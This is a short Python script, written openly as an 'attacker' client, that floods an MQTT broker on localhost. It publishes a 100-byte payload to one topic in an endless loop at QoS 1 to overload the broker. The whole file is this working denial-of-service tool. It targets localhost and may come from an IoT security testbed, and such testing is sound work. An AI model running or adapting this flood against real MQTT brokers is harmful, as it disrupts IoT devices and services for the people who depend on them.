import paho.mqtt.client as mqtt
import time

# --- Configuration ---
BROKER_HOST = "localhost"
BROKER_PORT = 1883
TOPIC = "iot/attacker/flood"
CLIENT_ID = "attacker_client"
PAYLOAD = "A" * 100 # Larger payload to increase broker load
QOS = 1

def on_connect(client, userdata, flags, rc):
    """Callback function for when the client connects to the broker."""
    if rc == 0:
        print(f"Attacker connected to MQTT Broker at {BROKER_HOST}:{BROKER_PORT}")
    else:
        print(f"Attacker failed to connect, return code {rc}\n")

def main():
    """Main function to run the attacker IoT client."""
    client = mqtt.Client(CLIENT_ID)
    client.on_connect = on_connect

    try:
        client.connect(BROKER_HOST, BROKER_PORT, 60)
    except ConnectionRefusedError:
        print("Connection refused. Is the MQTT broker running?")
        return

    client.loop_start()

    print(f"Starting attack: flooding topic '{TOPIC}' continuously.")
    try:
        while True:
            # Publish the message continuously without sleep
            result = client.publish(TOPIC, PAYLOAD, qos=QOS)

            # Optional: Check if the publish buffer is full, which might happen
            # under high load, and wait if necessary.
            if result.rc == mqtt.MQTT_ERR_QUEUE_SIZE:
                time.sleep(0.01) # Small delay to allow the queue to clear

    except KeyboardInterrupt:
        print("\nDisconnecting attacker client.")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        client.loop_stop()
        client.disconnect()

if __name__ == '__main__':
    main()
